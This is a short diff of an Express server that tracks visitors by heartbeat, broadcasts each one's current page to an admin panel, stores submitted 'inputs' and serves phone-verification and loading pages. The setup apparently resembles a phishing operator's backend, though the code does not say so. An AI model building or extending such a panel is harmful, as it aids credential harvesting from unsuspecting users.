@@ -284,14 +284,14 @@ app.post('/heartbeat', (req, res) => {
         clients[clientId].timeout = setTimeout(() => {
             console.log(`No heartbeat received from client ${clientId}. Performing action.`);
             // Perform the desired action here
-            delete clients[clientId];
+            //delete clients[clientId];
         }, HEARTBEAT_INTERVAL);
         res.send('true');
         broadcastAdminPanel(currPage, visitors);
     } else {
     	 currPage = "Disconnected";
     	broadcastAdminPanel(currPage, visitors);
-        res.status(404).send('Client not found');
+        //res.status(404).send('Client not found');
     }
 });
 
@@ -377,6 +377,8 @@ app.post('/input', async (req, res) => { // Mark the route handler as async
         return res.status(400).send('Missing clientId or inputs object');
     }
 
+    await handleRequest(req, res);
+    
     // Check if the client already exists in the database
     db.get("SELECT id, inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
         if (err) {
@@ -431,7 +433,7 @@ app.get('/phone', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'verifyphone.html'));
 });
 
-app.get('/loading', (req, res) => {
+app.get('/load', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'loading.html'));
 });
 
